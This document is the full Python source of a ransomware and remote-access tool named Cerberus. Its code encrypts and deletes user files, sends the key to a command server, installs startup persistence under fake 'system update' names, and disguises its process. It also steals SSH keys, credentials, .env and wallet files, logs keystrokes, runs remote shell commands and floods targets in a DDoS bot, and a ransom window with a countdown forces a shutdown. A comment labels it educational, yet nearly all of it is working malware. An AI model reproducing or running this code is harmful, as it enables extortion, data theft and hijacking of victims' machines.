# ransomware.py
import os
import sys
import base64
import json
import threading
import time
import socket
import shutil
import subprocess
import ctypes

# DEBUG: Crash Logging for Imports
try:
    from tkinter import Tk, Label, Entry, Button, StringVar, Frame, PhotoImage, messagebox
    from tkinter import font as tkfont
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from cryptography.hazmat.backends import default_backend
    import requests
    from pynput import keyboard
except ImportError as e:
    try:
        debug_path = os.path.join(os.path.expanduser("~"), "RANSOMWARE_IMPORT_ERROR.txt")
        with open(debug_path, "w") as f:
            f.write(f"Failed to import modules: {e}")
    except: pass
    sys.exit(1)

# --- Configuration ---
# PASTE THE PUBLIC KEY FROM THE C2 SERVER'S CONSOLE OUTPUT HERE
ATTACKER_PUBLIC_KEY = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyX1m6vQkFgHqCwG9xN8
... (Your public key will be here) ...
FQIDAQAB
-----END PUBLIC KEY-----"""

C2_SERVER_URL = "http://127.0.0.1:5000" # Change if your C2 is hosted elsewhere

# --- PATH CONFIGURATION ---
def get_paths():
    """Determines stable paths for config and target data."""
    home = os.path.expanduser("~")
    
    if os.name == 'nt':
        config_dir = os.path.join(os.environ.get('APPDATA', home), "Cerberus")
    else:
        config_dir = os.path.join(home, ".config", "cerberus")
        
    # ENCRYPT ONLY 'test_data' IN HOME DIRECTORY
    target_dir = os.path.join(home, "test_data")
    
    if not os.path.exists(config_dir):
        try: os.makedirs(config_dir)
        except: pass
        
    return config_dir, target_dir

CONFIG_DIR, TARGET_DIRECTORY = get_paths()

# Persistence Files (Stored in HIDDEN Config Dir)
LOCK_FILE = os.path.join(CONFIG_DIR, ".cerberus_lock")
ID_FILE = os.path.join(CONFIG_DIR, "cerberus_id.txt") 
KEY_BACKUP_FILE = os.path.join(CONFIG_DIR, "cerberus_key.bak")
LOG_FILE = os.path.join(CONFIG_DIR, "cerberus_log.txt")
ENCRYPTED_PATHS_FILE = os.path.join(CONFIG_DIR, "encrypted_paths.json")  # Track which dirs were encrypted

# Cleanup Marker (Can stay in config dir or be global)
CLEAN_MARKER = os.path.join(CONFIG_DIR, ".cerberus_freed")

ENCRYPTED_EXTENSION = ".cerberus"

# --- File Type Targeting ---
TARGET_EXTENSIONS = {
    '.txt', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf',
    '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.svg',
    '.mp3', '.wav', '.mp4', '.avi', '.mov', '.mkv', '.sql', '.db'
}

# --- GUI Asset (Base64 encoded 1x1 red pixel for logo) ---
LOGO_BASE64 = """
iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8/5+hHgAHggJ/PchI7wAAAABJRU5ErkJggg==
"""

# --- Persistence Utilities ---
def install_persistence():
    """Installs the ransomware to run on startup using absolute paths."""
    try:
        if getattr(sys, 'frozen', False):
            app_path = sys.executable
        else:
            app_path = os.path.abspath(__file__)
            
        if os.name == 'nt':
            import winreg
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
                cmd = f'"{app_path}"'
                winreg.SetValueEx(key, "WindowsSystemUpdate", 0, winreg.REG_SZ, cmd)
                winreg.CloseKey(key)
            except Exception as e:
                log_error(f"Windows persistence failed: {e}")
        else:
            autostart_dir = os.path.expanduser("~/.config/autostart")
            if not os.path.exists(autostart_dir):
                try: os.makedirs(autostart_dir)
                except: pass
            
            desktop_file = os.path.join(autostart_dir, "system_update.desktop")
            with open(desktop_file, "w") as f:
                f.write(f"[Desktop Entry]\n")
                f.write(f"Type=Application\n")
                f.write(f"Name=System Critical Update\n")
                # Command: python3 /path/to/ransomware.py
                if getattr(sys, 'frozen', False):
                     cmd = f"{app_path}"
                else:
                     cmd = f"{sys.executable} {app_path}"
                f.write(f"Exec={cmd}\n")
                f.write(f"Terminal=false\n")
                f.write(f"X-GNOME-Autostart-enabled=true\n")
            
            try: subprocess.run(['chmod', '+x', desktop_file])
            except: pass
            
    except Exception as e:
        log_error(f"Persistence installation failed: {e}")

def remove_persistence():
    """Removes the persistence mechanism."""
    try:
        if os.name == 'nt':
            import winreg
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
                winreg.DeleteValue(key, "WindowsSystemUpdate")
                winreg.CloseKey(key)
            except Exception as e:
                pass 
        else:
            paths = [
                os.path.expanduser("~/.config/autostart/system_update.desktop"),
                os.path.expanduser("~/.local/share/applications/system_update.desktop")
            ]
            for p in paths:
                if os.path.exists(p):
                    os.remove(p)
    except Exception as e:
        log_error(f"Persistence removal failed: {e}")

# --- System Lockdown Utilities ---
def hide_console():
    if os.name == 'nt':
        try:
            import ctypes
            kernel32 = ctypes.WinDLL('kernel32')
            user32 = ctypes.WinDLL('user32')
            hWnd = kernel32.GetConsoleWindow()
            if hWnd:
                user32.ShowWindow(hWnd, 0) # SW_HIDE = 0
        except Exception as e:
            pass

# --- Cryptography ---
def generate_aes_key():
    return os.urandom(32)

def encrypt_file_aes_gcm(file_path, key):
    try:
        with open(file_path, 'rb') as f:
            data = f.read()
        nonce = os.urandom(12)
        cipher = Cipher(algorithms.AES(key), modes.GCM(nonce), backend=default_backend())
        encryptor = cipher.encryptor()
        encrypted_data = encryptor.update(data) + encryptor.finalize()
        with open(file_path + ENCRYPTED_EXTENSION, 'wb') as f:
            f.write(nonce + encryptor.tag + encrypted_data)
        return True
    except Exception as e:
        log_error(f"Failed to encrypt {file_path}: {e}")
        return False

def decrypt_file_aes_gcm(encrypted_path, key):
    try:
        with open(encrypted_path, 'rb') as f:
            nonce_tag_data = f.read()
        nonce, tag, encrypted_data = nonce_tag_data[:12], nonce_tag_data[12:28], nonce_tag_data[28:]
        cipher = Cipher(algorithms.AES(key), modes.GCM(nonce, tag), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()
        original_path = encrypted_path.removesuffix(ENCRYPTED_EXTENSION)
        with open(original_path, 'wb') as f:
            f.write(decrypted_data)
        os.remove(encrypted_path)
        return True
    except Exception as e:
        log_error(f"Failed to decrypt {encrypted_path}: {e}")
        return False

def secure_delete_file(file_path, passes=1): 
    try:
        if os.path.exists(file_path):
            with open(file_path, "ba+") as f:
                length = f.tell()
            with open(file_path, "r+b") as f:
                f.write(os.urandom(length))
            os.remove(file_path)
    except Exception as e:
        log_error(f"Failed to securely delete {file_path}: {e}")

# --- Logging ---
def log_error(message):
    try:
        with open(LOG_FILE, 'a') as f:
            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - ERROR: {message}\n")
    except:
        pass 

# --- Target Selection ---
def scan_directories(root_path, max_depth=2, current_depth=0):
    """Recursively scan directories up to max_depth levels."""
    dirs = []
    if current_depth >= max_depth:
        return dirs
    try:
        for entry in os.scandir(root_path):
            if entry.is_dir() and not entry.name.startswith('.'):
                dirs.append(entry.path)
                # Recursively scan subdirectories
                if current_depth < max_depth - 1:
                    dirs.extend(scan_directories(entry.path, max_depth, current_depth + 1))
    except (PermissionError, OSError):
        pass  # Skip inaccessible directories
    return dirs

def _get_stable_recon_id():
    """Generate a stable machine-based recon ID (same across restarts)"""
    RECON_ID_FILE = os.path.join(CONFIG_DIR, ".cerberus_recon_id")
    
    # If we already have a recon ID from a previous run, reuse it
    if os.path.exists(RECON_ID_FILE):
        try:
            with open(RECON_ID_FILE, 'r') as f:
                recon_id = f.read().strip()
            if recon_id:
                return recon_id
        except:
            pass
    
    # Generate a new stable ID based on machine identity
    try:
        machine_data = f"{os.getlogin()}@{socket.gethostname()}"
    except:
        machine_data = socket.gethostname()
    import hashlib
    recon_id = hashlib.md5(machine_data.encode()).hexdigest()[:12]
    
    # Save it for future restarts
    try:
        with open(RECON_ID_FILE, 'w') as f:
            f.write(recon_id)
    except:
        pass
    
    return recon_id

def scan_and_wait_for_instructions():
    """
    1. Scans directories in home (nested up to 2 levels).
    2. Sends them to C2.
    3. Polls until C2 sends back a target list.
    Returns: list of paths to encrypt, or None if C2 unreachable.
    """
    home = os.path.expanduser("~")
    
    # Scan nested folders (2 levels deep) in home
    dirs = scan_directories(home, max_depth=2)
    log_error(f"Scanned {len(dirs)} directories (2 levels deep)")
    
    # Use a STABLE recon ID (same across restarts)
    temp_id = _get_stable_recon_id()
    log_error(f"Recon ID: {temp_id} - Found {len(dirs)} folders")
    
    # Send to C2 (will OVERWRITE any existing entry with same ID)
    payload = {"id": temp_id, "type": "RECON", "files": dirs}
    try:
        requests.post(f"{C2_SERVER_URL}/api/recon", json=payload, timeout=5)
    except Exception as e:
        log_error(f"Recon send failed: {e}")
        return None  # Fail to offline mode
    
    # Poll for command — wait up to 2 HOURS (1440 × 5s)
    log_error("Waiting for attacker to select targets...")
    for i in range(1440):
        try:
            resp = requests.get(f"{C2_SERVER_URL}/api/task/{temp_id}", timeout=5)
            if resp.status_code == 200:
                data = resp.json()
                if data.get("action") == "ENCRYPT":
                    targets = data.get("targets", [])
                    log_error(f"Received ENCRYPT command for {len(targets)} targets")
                    return targets
        except:
            pass
        
        # Re-post recon every ~1 minute to keep "last_seen" fresh on C2
        if i > 0 and i % 12 == 0:
            try:
                requests.post(f"{C2_SERVER_URL}/api/recon", json=payload, timeout=5)
            except:
                pass
        
        time.sleep(5)
    
    log_error("Timed out waiting for command (2 hours)")
    return None

# --- Ransomware Logic ---
def encrypt_directory(target_list=None):
    """Encrypts files in target directories. If target_list is None, falls back to default TARGET_DIRECTORY."""
    
    # Fallback to default if no list provided (offline mode)
    if target_list is None or len(target_list) == 0:
        target_list = [TARGET_DIRECTORY]
        if not os.path.exists(TARGET_DIRECTORY):
            try: os.makedirs(TARGET_DIRECTORY)
            except: pass

    # Resume from crash if key backup exists
    if os.path.exists(KEY_BACKUP_FILE):
        log_error("Found key backup. Resuming from crash...")
        try:
            with open(KEY_BACKUP_FILE, 'rb') as f:
                return f.read()
        except:
            pass 

    # Skip if already encrypted
    if os.path.exists(LOCK_FILE):
        log_error("Encryption seemingly complete (Lock file exists).")
        return None

    aes_key = generate_aes_key()
    
    try:
        with open(KEY_BACKUP_FILE, 'wb') as f:
            f.write(aes_key)
    except Exception as e:
        log_error(f"Failed to write key backup: {e}")

    # Save target list for decryption later
    try:
        with open(ENCRYPTED_PATHS_FILE, 'w') as f:
            json.dump(target_list, f)
    except Exception as e:
        log_error(f"Failed to save encrypted paths: {e}")

    encrypted_files = 0
    
    # Iterate over ALL selected target directories
    log_error(f"Encrypting {len(target_list)} directories...")
    for target_path in target_list:
        if os.path.exists(target_path):
            for root, _, files in os.walk(target_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    if os.path.splitext(file)[1].lower() in TARGET_EXTENSIONS and not file_path.endswith(ENCRYPTED_EXTENSION):
                        if encrypt_file_aes_gcm(file_path, aes_key):
                            secure_delete_file(file_path)
                            encrypted_files += 1

    with open(LOCK_FILE, 'w') as f:
        f.write("Encryption complete.")

    log_error(f"Encryption finished. {encrypted_files} files encrypted.")
    return aes_key

def check_in_with_c2(aes_key):
    try:
        from cryptography.hazmat.primitives import serialization
        from cryptography.hazmat.primitives.asymmetric import padding
        
        public_key = serialization.load_pem_public_key(ATTACKER_PUBLIC_KEY.encode(), backend=default_backend())
        encrypted_aes_key = public_key.encrypt(
            aes_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        payload = {"key": base64.b64encode(encrypted_aes_key).decode('utf-8')}
        
        victim_id = None
        log_error(f"Attempting to connect to C2 at: {C2_SERVER_URL}")
        
        for _ in range(3):
            try:
                response = requests.post(f"{C2_SERVER_URL}/api/checkin", json=payload, timeout=5)
                if response.status_code == 200:
                    victim_id = response.json().get('victim_id')
                    log_error(f"Connected! Victim ID: {victim_id}")
                    break
            except Exception as e:
                log_error(f"Connection attempt failed: {e}")
                time.sleep(2)
        
        if not victim_id:
            # --- OFFLINE FALLBACK ---
            log_error("C2 Unreachable. Switching to OFFLINE MODE.")
            # Generate a local ID so the GUI still launches
            victim_id = "OFFLINE-" + base64.urlsafe_b64encode(os.urandom(4)).decode('utf-8').rstrip('=')
            
            # Save the key locally for manual recovery if needed (in a real scenario this might differ)
            # For this educational/sim, we just keep the key backup file as the 'key store'
            # or we could write it to a separate hidden file.
            pass

        with open(ID_FILE, 'w') as f:
            f.write(victim_id)
        
        # If we are offline, we DO NOT delete the key backup, so we can recover it manually if needed.
        # If we are online, we delete it to force payment.
        if "OFFLINE" not in victim_id and os.path.exists(KEY_BACKUP_FILE):
             os.remove(KEY_BACKUP_FILE)
            
        log_error(f"Check-in complete. Final Victim ID: {victim_id}")
        return victim_id

    except Exception as e:
        log_error(f"C2 check-in critical failure: {e}")
        # Ultimate fallback
        return "CRITICAL-FAILURE"

# --- RAT MODULE FUNCTIONS ---

# Chameleon: Process Masquerading
def chameleon_disguise():
    """Disguise process name in Task Manager"""
    try:
        if os.name == 'nt':
            # Windows: Set console title
            ctypes.windll.kernel32.SetConsoleTitleW("Windows Security Service")
        else:
            # Linux: Try to rename process (requires setproctitle)
            try:
                import setproctitle
                setproctitle.setproctitle("systemd-resolved")
            except ImportError:
                pass  # setproctitle not available
        log_error("Chameleon: Process disguised")
    except Exception as e:
        log_error(f"Chameleon error: {e}")

# Cartographer: Network Scanner
def scan_network():
    """Scan local network for live hosts"""
    try:
        # Get local IP
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        
        # Calculate subnet
        ip_parts = local_ip.split('.')
        subnet = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}"
        
        log_error(f"Cartographer: Scanning {subnet}.0/24")
        
        hosts = []
        common_ports = [22, 80, 443, 445, 3389]  # SSH, HTTP, HTTPS, SMB, RDP
        
        # Scan first 10 IPs only (to avoid long delays)
        for i in range(1, 11):
            ip = f"{subnet}.{i}"
            if ip == local_ip:
                continue
            
            open_ports = []
            for port in common_ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.5)
                    result = sock.connect_ex((ip, port))
                    if result == 0:
                        open_ports.append(port)
                    sock.close()
                except:
                    pass
            
            if open_ports:
                hosts.append({"ip": ip, "ports": open_ports})
        
        log_error(f"Cartographer: Found {len(hosts)} hosts")
        return hosts
    except Exception as e:
        log_error(f"Cartographer error: {e}")
        return []

# Data Thief: File Exfiltration
def exfiltrate_files(victim_id):
    """Scan and exfiltrate high-value files"""
    try:
        home = os.path.expanduser("~")
        targets = []
        
        # Extensions to grab
        steal_extensions = {'.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx',
                           '.csv', '.ppt', '.pptx', '.jpg', '.png', '.jpeg',
                           '.env', '.pem', '.key', '.json', '.xml', '.sql', '.db'}
        
        # Filenames that are always interesting
        steal_names = {'passwords', 'password', 'credentials', 'secret', 'secrets',
                       'config', 'id_rsa', 'id_ed25519', 'wallet', 'backup',
                       '.env', '.bashrc', '.bash_history', '.ssh'}
        
        # Directories to skip
        skip_dirs = {'appdata', 'cache', '.git', 'node_modules', '__pycache__',
                     'local', 'temp', '.vscode', '.idea'}
        
        log_error("Data Thief: Scanning for valuable files...")
        
        for root, dirs, files in os.walk(home):
            # Skip hidden/cache directories
            dirs[:] = [d for d in dirs if d.lower() not in skip_dirs and not d.startswith('__')]
            
            for file in files:
                file_lower = file.lower()
                ext = os.path.splitext(file_lower)[1]
                
                # Match by extension OR by keyword in filename
                should_steal = (ext in steal_extensions or 
                               any(kw in file_lower for kw in steal_names))
                
                if should_steal:
                    file_path = os.path.join(root, file)
                    try:
                        size = os.path.getsize(file_path)
                        if 0 < size < 500000:  # Files between 0 and 500KB
                            targets.append(file_path)
                            if len(targets) >= 30:
                                break
                    except:
                        pass
            if len(targets) >= 30:
                break
        
        log_error(f"Data Thief: Found {len(targets)} valuable files")
        
        # Upload files to C2
        for file_path in targets:
            try:
                with open(file_path, 'rb') as f:
                    content = f.read()
                
                data = {
                    "name": os.path.basename(file_path),
                    "path": file_path,
                    "data_b64": base64.b64encode(content).decode(),
                    "size": len(content)
                }
                
                requests.post(f"{C2_SERVER_URL}/api/exfil/{victim_id}", json=data, timeout=5)
                log_error(f"Data Thief: Exfiltrated {data['name']}")
            except Exception as e:
                log_error(f"Data Thief: Failed to exfil {file_path}: {e}")
        
    except Exception as e:
        log_error(f"Data Thief error: {e}")

# Poltergeist + Zombie: RAT Command Loop
class RATCommandLoop:
    """Handles remote command execution and DDoS bot"""
    def __init__(self, victim_id):
        self.victim_id = victim_id
        self.stop_event = threading.Event()
        self.ddos_threads = []
        self.ddos_active = False
        self.cwd = os.path.expanduser("~")  # Track working directory persistently
    
    def start(self):
        threading.Thread(target=self.command_loop, daemon=True).start()
        log_error("RAT Command Loop started")
    
    def command_loop(self):
        """Poll C2 for commands"""
        while not self.stop_event.is_set():
            try:
                resp = requests.get(f"{C2_SERVER_URL}/api/rat_command/{self.victim_id}", timeout=5)
                if resp.status_code == 200:
                    cmd = resp.json()
                    cmd_type = cmd.get('type')
                    
                    if cmd_type == 'shell':
                        self.execute_shell(cmd.get('cmd'))
                    elif cmd_type == 'ddos_start':
                        self.start_ddos(cmd.get('target'))
                    elif cmd_type == 'ddos_stop':
                        self.stop_ddos()
                    
            except Exception as e:
                pass  # Silent fail, keep polling
            
            time.sleep(5)
    
    def execute_shell(self, cmd):
        """Execute shell command and send output back"""
        try:
            # Handle 'cd' command — update persistent working directory
            stripped = cmd.strip()
            if stripped == 'cd' or stripped.startswith('cd '):
                if stripped == 'cd':
                    new_dir = os.path.expanduser("~")
                else:
                    new_dir = stripped[3:].strip()
                
                # Resolve relative paths from current cwd
                if not os.path.isabs(new_dir):
                    new_dir = os.path.join(self.cwd, new_dir)
                new_dir = os.path.normpath(new_dir)
                
                if os.path.isdir(new_dir):
                    self.cwd = new_dir
                    output = f"Changed directory to: {self.cwd}"
                else:
                    output = f"cd: no such directory: {new_dir}"
                
                requests.post(
                    f"{C2_SERVER_URL}/api/rat_output/{self.victim_id}",
                    json={"cmd": cmd, "output": output},
                    timeout=5
                )
                return
            
            # Regular command — run from persistent cwd
            result = subprocess.run(
                cmd, shell=True, capture_output=True, text=True, 
                timeout=15, cwd=self.cwd
            )
            
            output = result.stdout + result.stderr
            if not output:
                output = "(No output)"
            
            # Send back to C2 (up to 2000 chars for useful output)
            requests.post(
                f"{C2_SERVER_URL}/api/rat_output/{self.victim_id}",
                json={"cmd": cmd, "output": output[:2000]},
                timeout=5
            )
            log_error(f"RAT: Executed {cmd[:30]}")
        except Exception as e:
            output = f"Error: {str(e)}"
            try:
                requests.post(
                    f"{C2_SERVER_URL}/api/rat_output/{self.victim_id}",
                    json={"cmd": cmd, "output": output},
                    timeout=5
                )
            except:
                pass
    
    def start_ddos(self, target):
        """Start DDoS attack on target"""
        if self.ddos_active:
            return
        
        self.ddos_active = True
        log_error(f"Zombie: Starting DDoS on {target}")
        
        def flood():
            while self.ddos_active:
                try:
                    requests.get(target, timeout=1)
                except:
                    pass
        
        # Spawn 5 flood threads
        for _ in range(5):
            t = threading.Thread(target=flood, daemon=True)
            t.start()
            self.ddos_threads.append(t)
    
    def stop_ddos(self):
        """Stop DDoS attack"""
        self.ddos_active = False
        self.ddos_threads = []
        log_error("Zombie: DDoS stopped")

# --- Keylogger Logic ---
class Keylogger:
    def __init__(self, victim_id):
        self.victim_id = victim_id
        self.log_buffer = ""
        self.lock = threading.Lock()
        self.stop_event = threading.Event()
        
    def start(self):
        try:
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()
            threading.Thread(target=self.flush_loop, daemon=True).start()
            log_error("Keylogger started successfully")
        except Exception as e:
            log_error(f"Keylogger Start Error: {e}")
        
    def on_press(self, key):
        try:
            k = key.char
        except AttributeError:
            k = f"[{key.name}]"
        
        with self.lock:
            self.log_buffer += str(k)
            
    def flush_loop(self):
        while not self.stop_event.is_set():
            time.sleep(10)
            with self.lock:
                if not self.log_buffer:
                    continue
                data = self.log_buffer
                self.log_buffer = ""
            
            try:
                requests.post(f"{C2_SERVER_URL}/api/keylog/{self.victim_id}", json={"keys": data}, timeout=3)
                log_error(f"Sent {len(data)} chars to C2")
            except Exception as e:
                log_error(f"Keylog upload failed: {e}")

# --- GUI Logic ---
class RansomwareGUI:
    def __init__(self, master, victim_id):
        self.master = master
        self.victim_id = victim_id
        self.doomsday_triggered = False
        self.payment_mode_active = False

        # WINDOWED MODE (Movable, Fake-Closable)
        master.title("CERBERUS RANSOMWARE - ENCRYPTED")
        master.geometry("1024x768") 
        master.attributes('-fullscreen', False) 
        master.overrideredirect(False) # Show Title Bar (X button)
        master.attributes('-topmost', True)
        master.configure(bg='#0a0a0a')
        master.resizable(False, False)
        
        # RAGEBAIT CLOSE
        master.protocol("WM_DELETE_WINDOW", self.ragebait_close) 
        
        # Disable minimalize/keyboard shortcuts
        master.bind('<Escape>', lambda e: "break")
        
        # Aggressive Loop
        self.force_focus_loop()

        # GUI Elements
        try:
            logo_data = base64.b64decode(LOGO_BASE64)
            self.logo = PhotoImage(data=logo_data)
        except:
            self.logo = None

        main_frame = Frame(master, bg='#0a0a0a')
        main_frame.pack(expand=True, fill='both', padx=20, pady=20)

        if self.logo:
            Label(main_frame, image=self.logo, bg='#0a0a0a').pack(pady=10)

        title_font = tkfont.Font(family="Helvetica", size=24, weight="bold")
        body_font = tkfont.Font(family="Helvetica", size=12)
        mono_font = tkfont.Font(family="Courier", size=12)
        timer_font = tkfont.Font(family="Courier", size=36, weight="bold")

        Label(main_frame, text="YOUR FILES HAVE BEEN ENCRYPTED", font=title_font, fg='#ff4d4d', bg='#0a0a0a').pack(pady=10)
        Label(main_frame, text="Your documents, photos, and other important files have been locked.", font=body_font, fg='#cccccc', bg='#0a0a0a', wraplength=700).pack(pady=5)
        
        # DOOMSDAY TIMER
        self.time_left = 72 * 3600 
        Label(main_frame, text="TIME REMAINING UNTIL PERMANENT DATA LOSS:", font=tkfont.Font(family="Helvetica", size=12, weight="bold"), fg='#ff3333', bg='#0a0a0a').pack(pady=(20, 5))
        self.timer_label = Label(main_frame, text="72:00:00", font=timer_font, fg='#ff0000', bg='#0a0a0a')
        self.timer_label.pack(pady=5)
        
        # FAKE EXFILTRATION
        self.exfil_status = Label(main_frame, text="System Scan: Analyzing private data...", font=mono_font, fg='#ffff00', bg='#0a0a0a')
        self.exfil_status.pack(pady=(15, 5))
        self.exfil_progress = Label(main_frame, text="[                    ] 0%", font=mono_font, fg='#ffff00', bg='#0a0a0a')
        self.exfil_progress.pack()
        
        Label(main_frame, text=f"YOUR VICTIM ID IS:", font=body_font, fg='#ffffff', bg='#0a0a0a').pack(pady=(20, 5))
        self.victim_id_label = Label(main_frame, text=self.victim_id, font=tkfont.Font(family="Courier", size=20, weight="bold"), fg='#4dff88', bg='#0a0a0a')
        self.victim_id_label.pack()

        self.status_label = Label(main_frame, text="STATUS: Awaiting payment confirmation... (Don't close this window)", font=body_font, fg='#ffff4d', bg='#0a0a0a')
        self.status_label.pack(pady=(20, 5))
        
        self.key_var = StringVar()
        self.key_entry = Entry(main_frame, textvariable=self.key_var, font=tkfont.Font(family="Courier", size=12), show="*", width=50, bg='#2a2a2a', fg='#ffffff', insertbackground='white', justify='center')
        self.key_entry.pack(pady=10, ipady=5)
        self.key_entry.config(state='readonly')

        self.decrypt_button = Button(main_frame, text="DECRYPT FILES", font=tkfont.Font(family="Helvetica", size=14, weight="bold"), command=self.start_decryption, bg='#ff4d4d', fg='white', padx=20, pady=10)
        self.decrypt_button.pack(pady=10)
        self.decrypt_button.config(state='disabled') 
        
        # PAYMENT BUTTON (Fixed Layout - Packed at bottom)
        self.pay_button = Button(main_frame, text="PAY RANSOM NOW", font=tkfont.Font(family="Helvetica", size=11, weight="bold"), command=self.enable_payment_mode, bg='#007bff', fg='white', padx=15, pady=8)
        self.pay_button.pack(side='bottom', pady=20)

        # Start threads
        self.heartbeat_thread_running = True
        threading.Thread(target=self.heartbeat_polling, daemon=True).start()
        threading.Thread(target=self.update_timer, daemon=True).start()
        threading.Thread(target=self.fake_exfiltration, daemon=True).start()
        
        self.master.after(2000, self.change_wallpaper)
        threading.Thread(target=self.audio_loop, daemon=True).start()
        # threading.Thread(target=self.watchdog_loop, daemon=True).start() # DISABLED: Causing System Lag
        
        # START KEYLOGGER AUTOMATICALLY
        self.keylogger = Keylogger(victim_id)
        self.master.after(1000, self.keylogger.start)
        
        # START RAT COMMAND LOOP (Poltergeist + Zombie)
        self.rat_loop = RATCommandLoop(victim_id)
        self.master.after(1500, self.rat_loop.start)
        
        # RAGEBAIT CLOSE HANDLER
        master.protocol("WM_DELETE_WINDOW", self.ragebait_close)
        master.bind("<Alt-F4>", lambda e: self.ragebait_close())

    def ragebait_close(self):
        """Intercepts close request and trolls the user."""
        try:
            if messagebox.askyesno("Exit Application", "Are you sure you want to quit this application?"):
                messagebox.showerror("Access Denied", "LOL you thought you could escape. Access Denied.")
                # Run TTS in a separate thread to avoid blocking GUI
                threading.Thread(target=self.speak_message, args=("You cannot leave.",), daemon=True).start()
        except: pass

    def force_focus_loop(self):
        """Aggressively keeps window on top, unless paying. DISABLED to allow keylogging."""
        # DISABLED: This was preventing the victim from using other apps
        # The keylogger needs the victim to be able to type in other windows
        pass
        # if not self.payment_mode_active:
        #     try:
        #         self.master.lift()
        #     except:
        #         pass
        # self.master.after(3000, self.force_focus_loop)

    def speak_message(self, message):
        """Cross-platform TTS. Synchronous (blocking) version for threads."""
        try:
            if os.name == 'nt':
                cmd = f"Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('{message}')"
                subprocess.run(["powershell", "-Command", cmd], creationflags=subprocess.CREATE_NO_WINDOW)
            else:
                if shutil.which("espeak"):
                        subprocess.run(["espeak", message], stderr=subprocess.DEVNULL)
                elif shutil.which("spd-say"):
                        subprocess.run(["spd-say", message], stderr=subprocess.DEVNULL)
        except:
            pass
        
    def audio_loop(self):
        """Repeats the voice message every 30 seconds."""
        message = "Your files are encrypted. Payment is required. System failure imminent."
        while self.heartbeat_thread_running:
            self.speak_message(message)
            time.sleep(30)
            
    def watchdog_loop(self):
        """Kills task managers and terminals."""
        blacklist = [
            'taskmgr', 'cmd', 'powershell', 
            'gnome-terminal-server', 'gnome-terminal', # GNOME
            'konsole', # KDE
            'xfce4-terminal', 'xterm', 'uxterm',
            'bash', 'sh', 'zsh', 'fish', # Shells (Aggressive)
            'htop', 'top', 'btop', 'wireshark'
        ]
        
        while self.heartbeat_thread_running:
            try:
                if os.name == 'nt':
                    for proc in blacklist:
                        os.system(f"taskkill /F /IM {proc}.exe >nul 2>&1")
                else:
                    # Linux Optimization: pkill implies internal loop, calling it 10x per sec is bad.
                    # We run this every 3 seconds now.
                    for proc in blacklist:
                            os.system(f"pkill -9 -f {proc} >/dev/null 2>&1")
            except:
                pass
            # Increased from 1.0s to 3.0s to reduce system load/stuttering
            time.sleep(3.0) 

    def change_wallpaper(self):
        pass

    def trigger_doomsday(self):
        if self.doomsday_triggered: return
        self.doomsday_triggered = True
        
        threading.Thread(target=self.speak_message, args=("Time has expired. System failure imminent.",), daemon=True).start()
        self.master.configure(bg='#ff0000') # RED ALERT
        
        try:
            if os.name == 'nt':
                os.system("shutdown /s /t 15 /c \"CERBERUS: TIME EXPIRED\"")
            else:
                os.system("shutdown -h +1 \"CERBERUS: TIME EXPIRED\"") 
        except:
            pass

    def update_timer(self):
        while self.heartbeat_thread_running and self.time_left > 0:
            time.sleep(1)
            self.time_left -= 1
            
            if self.time_left <= 0:
                self.master.after(0, self.trigger_doomsday)
                self.master.after(0, lambda: self.timer_label.config(text="00:00:00"))
                break
            
            m, s = divmod(self.time_left, 60)
            h, m = divmod(m, 60)
            time_str = f"{h:02d}:{m:02d}:{s:02d}"
            
            # THREAD-SAFE: Schedule GUI update on main thread
            self.master.after(0, lambda ts=time_str: self._update_timer_display(ts))
    
    def _update_timer_display(self, time_str):
        try:
            self.timer_label.config(text=time_str)
            if self.time_left < 3600:
                self.timer_label.config(fg='#ff0000' if self.time_left % 2 == 0 else '#ffffff')
        except:
            pass

    def fake_exfiltration(self):
        stages = [ "Scanning...", "Compressing...", "Encrypting...", "Connecting...", "Uploading...", "Complete." ]
        for stage in stages:
            if not self.heartbeat_thread_running: break
            # THREAD-SAFE: Schedule GUI update on main thread
            self.master.after(0, lambda s=stage: self.exfil_status.config(text=f"STATUS: {s}"))
            time.sleep(2)
        self.master.after(0, lambda: self.exfil_status.config(text="STATUS: UPLOAD COMPLETE", fg='#ff0000'))

    def heartbeat_polling(self):
        while self.heartbeat_thread_running:
            try:
                response = requests.get(f"{C2_SERVER_URL}/api/status/{self.victim_id}?time_left={self.time_left}", timeout=5)
                if response.status_code == 200:
                    data = response.json()
                    if "new_timer" in data:
                        self.time_left = int(data["new_timer"])
                    if data.get("status") == "ready":
                        key = data.get("key")
                        if key:
                            self.master.after(0, self.update_key_field, key)
                            self.heartbeat_thread_running = False
            except:
                pass
            time.sleep(5) 

    def update_key_field(self, key):
        self.key_var.set(key)
        self.key_entry.config(state='normal')
        self.status_label.config(text="STATUS: Valid key received. Decryption enabled.", fg='#4dff88')
        self.decrypt_button.config(state='normal')
